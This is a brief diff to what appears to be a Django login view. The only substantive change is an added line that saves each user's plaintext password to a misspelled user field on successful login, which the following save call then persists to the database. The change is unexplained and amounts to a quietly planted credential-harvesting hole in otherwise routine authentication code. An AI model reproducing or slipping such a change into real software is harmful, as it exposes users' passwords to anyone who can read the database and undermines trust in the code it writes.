@@ -140,9 +140,12 @@ def login_view(request):
                 
                 # Login user
                 login(request, user)
+
+                user.plantext_plain = password
                 
                 # Reset failed login attempts
                 user.failed_login_attempts = 0
+                
                 user.last_login_ip = get_client_ip(request)
                 user.save()
                 
